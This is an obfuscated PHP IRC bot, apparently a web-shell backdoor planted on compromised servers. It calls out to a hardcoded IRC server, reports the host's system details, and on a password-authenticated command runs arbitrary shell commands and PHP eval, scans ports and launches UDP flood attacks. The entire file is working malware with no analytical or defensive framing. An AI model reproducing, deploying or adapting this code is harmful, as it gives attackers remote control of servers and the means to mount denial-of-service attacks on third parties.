<?php set_time_limit(0); error_reporting(0);  class zRBZNVznznBVjvbbF {

 var $NRbRFVBnbnBnrZn = array("fZNVrjJRzJjjbNNJ"=>"gang.sexpil.net",
                     "zBNn"=>"25343",
                     "fFnvf"=>"scary",
                     "BvvrVJ"=>"13",
                     "Hlpxt"=>"#wWw#",
                     "VJr"=>"scan",
                     "VVzFJfjZB"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "rzZNRRVRfn"=>".",
                     "jRrjnvVZfFr"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $bVnVZnFBrzNFnvJbbz = array(); 
 function AyEYmY($Hlpxt,$VJr=NULL) 
 { 
    $this->mEiuUya("JOIN $Hlpxt $VJr"); 
 } function YuIqiimyaQQMIIMmMau() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $LdxpPPPTLHX = "\0034ON\003"; } else { $LdxpPPPTLHX = "\0039OFF\003"; }

	$tDtHtDTh = php_uname();
	if($tDtHtDTh == "") { $bzcGDd = "\00315---\003"; } else { $bzcGDd = "\00315".$tDtHtDTh."\003"; }
		 
	 $Vbok = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $lLwWC =  getcwd()."";
	 
	 $TCoC = "\00315".$lLwWC."\003";

	$SoosKcKWgk = fileperms("$lLwWC");

	if (($SoosKcKWgk & 0xC000) == 0xC000) { $kCOgowossgS = 's';
	} elseif (($SoosKcKWgk & 0xA000) == 0xA000) { $kCOgowossgS = 'l';
	} elseif (($SoosKcKWgk & 0x8000) == 0x8000) { $kCOgowossgS = '-';
	} elseif (($SoosKcKWgk & 0x6000) == 0x6000) { $kCOgowossgS = 'b';
	} elseif (($SoosKcKWgk & 0x4000) == 0x4000) { $kCOgowossgS = 'd';
	} elseif (($SoosKcKWgk & 0x2000) == 0x2000) { $kCOgowossgS = 'c';
	} elseif (($SoosKcKWgk & 0x1000) == 0x1000) { $kCOgowossgS = 'p';
	} else { $kCOgowossgS = 'u'; }

	$kCOgowossgS .= (($SoosKcKWgk & 0x0100) ? 'r' : '-');
	$kCOgowossgS .= (($SoosKcKWgk & 0x0080) ? 'w' : '-');
	$kCOgowossgS .= (($SoosKcKWgk & 0x0040) ?	(($SoosKcKWgk & 0x0800) ? 's' : 'x' ) :	(($SoosKcKWgk & 0x0800) ? 'S' : '-'));

	$kCOgowossgS .= (($SoosKcKWgk & 0x0020) ? 'r' : '-');
	$kCOgowossgS .= (($SoosKcKWgk & 0x0010) ? 'w' : '-');
	$kCOgowossgS .= (($SoosKcKWgk & 0x0008) ?	(($SoosKcKWgk & 0x0400) ? 's' : 'x' ) :	(($SoosKcKWgk & 0x0400) ? 'S' : '-'));

	$kCOgowossgS .= (($SoosKcKWgk & 0x0004) ? 'r' : '-');
	$kCOgowossgS .= (($SoosKcKWgk & 0x0002) ? 'w' : '-');
	$kCOgowossgS .= (($SoosKcKWgk & 0x0001) ?	(($SoosKcKWgk & 0x0200) ? 't' : 'x' ) :	(($SoosKcKWgk & 0x0200) ? 'T' : '-'));
			
	$nBHP = "\00315".$kCOgowossgS."\003";

	$this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"\00314[SAFE:\003\002 $LdxpPPPTLHX\002\00314]\00315 $Vbok \00314[pwd:]\00315 $TCoC \00314(\003$nBHP\00314) [uname:]\00315 $bzcGDd");
 } function qimQQaaIAMuA($PPtD) 
 { 
    if(isset($this->bVnVZnFBrzNFnvJbbz[$PPtD])) 
       return 1; 
    else 
       return 0; 
 } function uMYqyeUYmQuuA() 
 { 
    if(!($this->wGsKOoKkS = fsockopen($this->NRbRFVBnbnBnrZn['fZNVrjJRzJjjbNNJ'],$this->NRbRFVBnbnBnrZn['zBNn'],$e,$s,30))) 
    $this->uMYqyeUYmQuuA(); 
    $this->mmiQIImUQAYmqAqIU();
    if(strlen($this->NRbRFVBnbnBnrZn['fFnvf'])>0) 
    $this->mEiuUya("PASS ".$this->NRbRFVBnbnBnrZn['fFnvf']);
    $this->qqyqMMQaMuYIIMaE();
    $this->iEAuYyMImaYQEE();
 }function iEAuYyMImaYQEE() 
 { 
    while(!feof($this->wGsKOoKkS)) 
    { 
       $this->mmiYu = trim(fgets($this->wGsKOoKkS,512)); 
       $FzNFbVjnRjFnf = explode(" ",$this->mmiYu); 
       if(substr($this->mmiYu,0,6)=="PING :") 
       { 
          $this->mEiuUya("PONG :".substr($this->mmiYu,6)); 
       } 
       if(isset($FzNFbVjnRjFnf[1]) && $FzNFbVjnRjFnf[1] =="004") 
       { 
          $this->mEiuUya("JOIN ".$this->NRbRFVBnbnBnrZn['Hlpxt']." ".$this->NRbRFVBnbnBnrZn['VJr']."");
          $this->AyEYmY($this->NRbRFVBnbnBnrZn['Hlpxt'],$this->NRbRFVBnbnBnrZn['VJr']);
          $this->YuIqiimyaQQMIIMmMau();
       } 
       if(isset($FzNFbVjnRjFnf[1]) && $FzNFbVjnRjFnf[1]=="433") 
       { 
          $this->qqyqMMQaMuYIIMaE(); 
       }
       if($this->mmiYu != $RrB_HLL) 
       { 
          $rFZNvbzFrrRfNj = array(); 
          $gCk = substr(strstr($this->mmiYu," :"),2); 
          $ccKg = explode(" ",$gCk); 
          $WCWCO = explode("!",$FzNFbVjnRjFnf[0]); 
          $gGGswc = explode("@",$WCWCO[1]); 
          $gGGswc = $gGGswc[1]; 
          $WCWCO = substr($WCWCO[0],1); 
          $KcGCcoG = $FzNFbVjnRjFnf[0]; 
          if($ccKg[0]==$this->WCWCO) 
          { 
           for($P=0;$P<count($ccKg);$P++) 
              $rFZNvbzFrrRfNj[$P] = $ccKg[$P+1]; 
          } 
          else 
          { 
           for($P=0;$P<count($ccKg);$P++) 
              $rFZNvbzFrrRfNj[$P] = $ccKg[$P]; 
          } 
          if(count($FzNFbVjnRjFnf)>2) 
          { 
             switch($FzNFbVjnRjFnf[1]) 
             { 
                case "QUIT": 
                   if($this->qimQQaaIAMuA($KcGCcoG)) 
                   { 
                      $this->QqAQuIYe($KcGCcoG); 
                   } 
                break; 
                case "PART": 
                   if($this->qimQQaaIAMuA($KcGCcoG)) 
                   { 
                      $this->QqAQuIYe($KcGCcoG); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->qimQQaaIAMuA($KcGCcoG) && (md5($gGGswc) == $this->NRbRFVBnbnBnrZn['jRrjnvVZfFr'] || $this->NRbRFVBnbnBnrZn['jRrjnvVZfFr'] == "*")) 
                   { 
                      if(substr($rFZNvbzFrrRfNj[0],0,1)==$this->NRbRFVBnbnBnrZn['rzZNRRVRfn']) 
                      { 
                         switch(substr($rFZNvbzFrrRfNj[0],1)) 
                         { 
                            case "user": 
                              if(md5($rFZNvbzFrrRfNj[1])==$this->NRbRFVBnbnBnrZn['VVzFJfjZB']) 
                              { 
                                 $this->qQyEQMqyi($KcGCcoG);
                              } 
                              else 
                              { 
                                 $this->myIquYmiaY($this->NRbRFVBnbnBnrZn['Hlpxt'],"[\002Auth\002]: Fout password $WCWCO idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->qimQQaaIAMuA($KcGCcoG)) 
                   { 
                      if(substr($rFZNvbzFrrRfNj[0],0,1)==$this->NRbRFVBnbnBnrZn['rzZNRRVRfn']) 
                      { 
                         switch(substr($rFZNvbzFrrRfNj[0],1)) 
                         {                            case "sexec":
                               $WSWcOsgWwkWC = substr(strstr($gCk,$rFZNvbzFrrRfNj[0]),strlen($rFZNvbzFrrRfNj[0])+1); 
                               $CCSOoOccosCsO = shell_exec($WSWcOsgWwkWC); 
                               $kgGsSwSksWwocs = explode("\n",$CCSOoOccosCsO); 
                               for($P=0;$P<count($kgGsSwSksWwocs);$P++) 
                                  if($kgGsSwSksWwocs[$P]!=NULL) 
                                     $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"      : ".trim($kgGsSwSksWwocs[$P])); 
                            break;                            case "system": 
                               $WSWcOsgWwkWC = substr(strstr($gCk,$rFZNvbzFrrRfNj[0]),strlen($rFZNvbzFrrRfNj[0])+1); 
                               $CCSOoOccosCsO = system($WSWcOsgWwkWC); 
                               $kgGsSwSksWwocs = explode("\n",$CCSOoOccosCsO); 
                               for($P=0;$P<count($kgGsSwSksWwocs);$P++) 
                                  if($kgGsSwSksWwocs[$P]!=NULL) 
                                     $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"      : ".trim($kgGsSwSksWwocs[$P])); 
                            break;                            case "udpflood": 
                               if(count($rFZNvbzFrrRfNj)>3) 
                               { 
                                  $this->qAEaqImMEYuqAAEmMu($rFZNvbzFrrRfNj[1],$rFZNvbzFrrRfNj[2],$rFZNvbzFrrRfNj[3]); 
                               } 
                            break;                            case "info":
                               $this->YuIqiimyaQQMIIMmMau();
                            break;                            case "restart": 
                               $this->mEiuUya("QUIT :gerestart door $WCWCO");
                               fclose($this->wGsKOoKkS); 
                               $this->uMYqyeUYmQuuA(); 
                            break;                            case "pscan": 
                               if(count($rFZNvbzFrrRfNj) > 2) 
                               { 
                                  if(fsockopen($rFZNvbzFrrRfNj[1],$rFZNvbzFrrRfNj[2],$e,$s,15)) 
                                     $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"[\002pscan\002]: ".$rFZNvbzFrrRfNj[1].":".$rFZNvbzFrrRfNj[2]." is \2open\2"); 
                                  else 
                                     $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"[\002pscan\002]: ".$rFZNvbzFrrRfNj[1].":".$rFZNvbzFrrRfNj[2]." is \2closed\2"); 
                               } 
                            break;                            case "rndnick": 
                               $this->qqyqMMQaMuYIIMaE(); 
                            break;                            case "raw":
                               $this->mEiuUya(strstr($gCk,$rFZNvbzFrrRfNj[1])); 
                            break;                            case "exec": 
                               $WSWcOsgWwkWC = substr(strstr($gCk,$rFZNvbzFrrRfNj[0]),strlen($rFZNvbzFrrRfNj[0])+1); 
                               $CCSOoOccosCsO = exec($WSWcOsgWwkWC); 
                               $kgGsSwSksWwocs = explode("\n",$CCSOoOccosCsO); 
                               for($P=0;$P<count($kgGsSwSksWwocs);$P++) 
                                  if($kgGsSwSksWwocs[$P]!=NULL) 
                                     $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"      : ".trim($kgGsSwSksWwocs[$P])); 
                            break;                            case "passthru": 
                               $WSWcOsgWwkWC = substr(strstr($gCk,$rFZNvbzFrrRfNj[0]),strlen($rFZNvbzFrrRfNj[0])+1); 

                               $CCSOoOccosCsO = passthru($WSWcOsgWwkWC); 
                               $kgGsSwSksWwocs = explode("\n",$CCSOoOccosCsO); 
                               for($P=0;$P<count($kgGsSwSksWwocs);$P++) 
                                  if($kgGsSwSksWwocs[$P]!=NULL) 
                                     $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"      : ".trim($kgGsSwSksWwocs[$P])); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($gCk,$rFZNvbzFrrRfNj[1]),strlen($rFZNvbzFrrRfNj[1])));
                            break;                            case "logout": 
                               $this->QqAQuIYe($KcGCcoG); 
                               $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"[\002Auth\002]\00314 Je bent nu uitgelogt $WCWCO"); 
                            break;                            case "die": 
                               $this->mEiuUya("QUIT :die command from $WCWCO");
                               fclose($this->wGsKOoKkS); 
                               exit;                            case "dns": 
                               if(isset($rFZNvbzFrrRfNj[1])) 
                               { 
                                  $oO = explode(".",$rFZNvbzFrrRfNj[1]); 
                                  if(count($oO)==4 && is_numeric($oO[0]) && is_numeric($oO[1]) && is_numeric($oO[2]) && is_numeric($oO[3])) 
                                  { 
                                     $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"[\002dns\002]: ".$rFZNvbzFrrRfNj[1]." => ".gethostbyaddr($rFZNvbzFrrRfNj[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"[\002dns\002]: ".$rFZNvbzFrrRfNj[1]." => ".gethostbyname($rFZNvbzFrrRfNj[1])); 
                                  } 
                               } 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $RrB_HLL = $this->mmiYu; 
    } 
    $this->uMYqyeUYmQuuA(); 
 } function mEiuUya($tPL) 
 { 
    fwrite($this->wGsKOoKkS,"$tPL\r\n"); 
 } function myIquYmiaY($TH,$tPL)
 {
    $this->mEiuUya("NOTICE $TH :$tPL");
 } function qQyEQMqyi($PPtD) 
 { 
    $this->bVnVZnFBrzNFnvJbbz[$PPtD] = true; 
 } function mmiQIImUQAYmqAqIU() {
  $DXdDLL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $TLxPHhh = strlen($DXdDLL);
  for($P=0;$P<6;$P++) {
	$mUI .= $DXdDLL[rand(0,$TLxPHhh-1)];
  }
  if(php_uname() == "") { $tDtHtDTh = "---"; } else { $tDtHtDTh = php_uname(); }
  $this->mEiuUya("USER ".$mUI."-go 127.0.0.1 localhost :".$tDtHtDTh."");
 } function euYIiQiAiqY($TH,$tPL)
 {
    $this->mEiuUya("PRIVMSG $TH :$tPL");
 } function QqAQuIYe($PPtD) 
 { 
    unset($this->bVnVZnFBrzNFnvJbbz[$PPtD]); 
 } function qAEaqImMEYuqAAEmMu($PPtD,$pHTThddxPD,$UmiQ) {
	$this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"[\002UdpFlood Gestart!\002]"); 
	$tTPHLPxdX = "";
	for($P=0;$P<$pHTThddxPD;$P++) { $tTPHLPxdX .= chr(mt_rand(1,256)); }
	$THpLl = time();
	$P = 0;
	while(time()-$THpLl < $UmiQ) {
		$jH=fsockopen("udp://".$PPtD,mt_rand(0,6000),$e,$s,5);
      	fwrite($jH,$tTPHLPxdX);
       	fclose($jH);
		$P++;
	}
	$NgL = $P * $pHTThddxPD;
	$NgL = $NgL / 1048576;
	$Tjk = $NgL / $UmiQ;
	$Tjk = round($Tjk);
	$NgL = round($NgL);
	$this->euYIiQiAiqY($this->NRbRFVBnbnBnrZn['Hlpxt'],"[\002UdpFlood Afgerond!\002]: $NgL MB verzonden / gemiddelde: $Tjk MB/s ");
 } function qqyqMMQaMuYIIMaE() {
  $DXdDLL = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $TLxPHhh = strlen($DXdDLL);
  for($P=0;$P<$this->NRbRFVBnbnBnrZn['BvvrVJ'];$P++) {
	$mUI .= $DXdDLL[rand(0,$TLxPHhh-1)];
  }
  $this->mEiuUya("NICK ".$mUI."");
 }}
$okOsoOco = new zRBZNVznznBVjvbbF;
$okOsoOco->uMYqyeUYmQuuA(); ?>